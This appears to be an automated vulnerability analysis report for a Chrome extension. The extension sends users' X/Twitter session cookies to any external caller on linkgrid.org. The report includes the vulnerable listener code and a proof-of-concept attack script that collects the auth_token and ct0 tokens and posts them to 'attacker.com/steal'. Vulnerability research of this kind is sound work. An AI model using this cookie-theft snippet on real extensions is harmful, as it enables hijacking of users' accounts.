# CoCo Analysis: mkbhdfdplnklfplidkjhgihalhclpmhf

## Summary

- **Overall Assessment:** TRUE POSITIVE
- **Total Sinks Detected:** 1 (cookies_source → sendResponseExternal_sink)

---

## Sink: cookies_source → sendResponseExternal_sink

**CoCo Trace:**
```
$FilePath$/home/teofanescu/cwsCoCo/extensions_local/mkbhdfdplnklfplidkjhgihalhclpmhf/opgen_generated_files/bg.js
Line 684-694   var cookie_source = { domain: '.uspto.gov', ... }
Line 1006      cookie: JSON.stringify(cookies),
```

**Note:** CoCo referenced framework mock code at lines 684-694 (before the 3rd "// original" marker at line 963). The actual vulnerable flow exists in the real extension code after line 963.

**Code:**

```javascript
// Line 984-1016: External message listener - Entry point
chrome.runtime.onMessageExternal.addListener((request, sender, sendResponse) => {
  if (request.type === "FETCH_COOKIES") { // ← External attacker can trigger
    const twitterUrl = "https://x.com";

    chrome.cookies.getAll({ url: twitterUrl }, (cookies) => { // ← Read X/Twitter cookies
      const authToken = cookies.find((cookie) => cookie.name === "auth_token");
      const ct0Token = cookies.find((cookie) => cookie.name === "ct0");

      if (!authToken || !ct0Token) {
        chrome.tabs.create({ url: "https://x.com/i/flow/login" });
        sendResponse({
          success: false,
          message: "Redirecting to X login page.",
        });
        return;
      }

      if (authToken && ct0Token) {
        sendResponse({ // ← Send sensitive cookies back to external caller
          success: true,
          auth_token: authToken.value, // ← Sensitive session token
          ct0: ct0Token.value,          // ← CSRF token
          cookie: JSON.stringify(cookies), // ← All X.com cookies
        });
      } else {
        sendResponse({ success: false, message: "Required cookies not found" });
      }
    });

    return true; // Indicates async response
  }
});
```

**Classification:** TRUE POSITIVE

**Attack Vector:** chrome.runtime.onMessageExternal

**Attack:**

```javascript
// Attacker's malicious page on https://linkgrid.org/*
// (allowed by externally_connectable in manifest.json line 33-35)

chrome.runtime.sendMessage(
  "mkbhdfdplnklfplidkjhgihalhclpmhf", // Extension ID
  { type: "FETCH_COOKIES" },
  function(response) {
    if (response.success) {
      console.log("Stolen auth_token:", response.auth_token);
      console.log("Stolen ct0:", response.ct0);
      console.log("All X.com cookies:", response.cookie);

      // Exfiltrate to attacker server
      fetch("https://attacker.com/steal", {
        method: "POST",
        body: JSON.stringify({
          auth_token: response.auth_token,
          ct0: response.ct0,
          all_cookies: response.cookie
        })
      });
    }
  }
);
```

**Impact:** Sensitive data exfiltration. An attacker controlling a page on https://linkgrid.org/* (per externally_connectable whitelist in manifest.json lines 33-35) can steal the user's X/Twitter session cookies, including the auth_token (authentication token) and ct0 (CSRF token). With these tokens, the attacker can hijack the user's X/Twitter session and perform actions as the user (tweet, follow, read DMs, etc.). The extension has "cookies" permission (manifest.json line 15) and host_permissions for "https://x.com/*" (line 18), enabling chrome.cookies.getAll API access. The vulnerability exists because line 1002-1007 sends sensitive cookie data back via sendResponse to any external caller without validation.
